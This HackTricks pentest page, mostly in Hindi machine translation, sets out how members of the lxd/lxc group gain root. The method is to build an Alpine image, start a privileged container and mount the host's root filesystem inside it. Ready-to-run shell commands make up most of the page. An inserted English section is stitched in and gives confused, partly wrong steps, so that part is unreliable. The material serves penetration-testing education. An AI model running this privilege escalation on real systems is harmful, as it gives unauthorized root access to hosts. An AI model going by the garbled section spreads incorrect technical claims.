# lxd/lxc समूह - प्रिविलेज एस्केलेशन

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स को** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **में पीआर जमा करके अपना योगदान दें।**

</details>

यदि आप _**lxd**_ **या** _**lxc**_ **समूह** में शामिल हैं, तो आप रूट बन सकते हैं

## इंटरनेट के बिना उत्पन्न करना

### विधि 1

आप अपनी मशीन में इस डिस्ट्रो बिल्डर को इंस्टॉल कर सकते हैं: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(गिटहब के निर्देशों का पालन करें):
```bash
sudo su
#Install requirements
sudo apt update
sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools
#Clone repo
git clone https://github.com/lxc/distrobuilder
#Make distrobuilder
cd distrobuilder
make
#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
#Create the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
```
तब, विकल्पशील सर्वर पर फ़ाइलें **lxd.tar.xz** और **rootfs.squashfs** अपलोड करें

चित्र जोड़ें:
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list #You can see your new imported image
```
# LXD Privilege Escalation

## Introduction

In this section, we will discuss a privilege escalation technique in LXD, a container hypervisor for Linux systems. By exploiting certain misconfigurations, an attacker can escalate their privileges from a non-root user to root within the container.

## Container Creation

To begin, we need to create a container using the LXD command-line tool. Run the following command to create a new container named `mycontainer`:

```bash
lxc launch ubuntu:18.04 mycontainer
```

This command will create a new container based on the Ubuntu 18.04 image.

## Adding Root Path

Once the container is created, we can add the root path to the container's configuration. This will allow us to mount the host's root filesystem within the container.

To add the root path, run the following command:

```bash
lxc config device add mycontainer rootdisk disk source=/ path=/mnt/root recursive=true
```

This command will add a new device named `rootdisk` to the `mycontainer` container. The `source` parameter specifies the path to the host's root filesystem, and the `path` parameter specifies the mount point within the container.

## Privilege Escalation

With the root path added, we can now escalate our privileges within the container. By mounting the host's root filesystem, we gain access to sensitive system files and directories.

To mount the root filesystem, run the following command within the container:

```bash
mount /mnt/root
```

Once the root filesystem is mounted, we can navigate to the `/mnt/root` directory and access any files or directories within it.

## Conclusion

By adding the root path to a container's configuration, we can escalate our privileges within the container and gain access to the host's root filesystem. This technique can be used to perform further privilege escalation or gain unauthorized access to sensitive system files. It is important to ensure proper security measures are in place to prevent such attacks.
```bash
lxc init alpine privesc -c security.privileged=true
lxc list #List containers

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
{% hint style="danger" %}
यदि आपको यह त्रुटि मिलती है _**त्रुटि: कोई स्टोरेज पूल नहीं मिला। कृपया एक नया स्टोरेज पूल बनाएं**_\
**`lxd init`** चलाएं और **पिछले चंक को दोहराएं**
{% endhint %}

कंटेनर को निष्पादित करें:
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### तरीका 2

एक Alpine इमेज बनाएं और इसे फ़्लैग `security.privileged=true` का उपयोग करके शुरू करें, जो कंटेनर को मजबूर करेगा कि वह मेजबान फ़ाइल सिस्टम के साथ रूट के रूप में संवाद करें।
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# interact with the container
lxc start mycontainer
lxc exec mycontainer /bin/sh
```
वैकल्पिक रूप से [https://github.com/initstring/lxd\_root](https://github.com/initstring/lxd\_root)

## इंटरनेट के साथ

आप [इन निर्देशों](https://reboare.github.io/lxd/lxd-escape.html) का पालन कर सकते हैं।
```bash
lxc init ubuntu:16.04 test -c security.privileged=true
lxc config device add test whatever disk source=/ path=/mnt/root recursive=true
lxc start test
lxc exec test bash
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
## अन्य संदर्भ

{% embed url="https://reboare.github.io/lxd/lxd-escape.html" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** का पालन करें**.
* **अपने हैकिंग ट्रिक्स को** [**hacktricks रेपो**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **में पीआर जमा करके अपना योगदान दें**.

</details>
